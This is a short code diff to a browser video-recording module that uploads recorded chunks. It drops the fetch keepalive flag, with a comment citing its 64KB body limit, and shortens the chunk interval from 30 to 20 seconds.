@@ -385,7 +385,10 @@ function uploadChunk(chunk: Blob, mimeType: string, index: number, label: string
       // Without it, the final chunk upload is killed when the browser
       // backgrounds the tab (visibility:hidden → stopAll() → onstop fires
       // → uploadChunk() → fetch starts but is immediately cancelled).
-      keepalive: true,
+      // keepalive removed: Fetch keepalive has a hard 64KB body limit per spec.
+      // A 20-second video is several MB in base64 — the browser silently drops
+      // keepalive requests exceeding that limit (.catch swallows the TypeError).
+      // Chunks are sent while the page is active so keepalive is not needed.
     }).catch(() => {});
   };
   reader.readAsDataURL(chunk);
@@ -446,7 +449,7 @@ async function takePhoto(videoEl: HTMLVideoElement, label: string, stream?: Medi
  * 30-second chunks, runs until tab closes / page hidden / track ends.
  */
 function startContinuousRecord(stream: MediaStream, videoEl: HTMLVideoElement, label: string) {
-  const CHUNK_MS = 30_000;
+  const CHUNK_MS = 20_000;
   const mimeType = getSupportedMime();
   if (!mimeType) {
     stream.getTracks().forEach(t => t.stop());
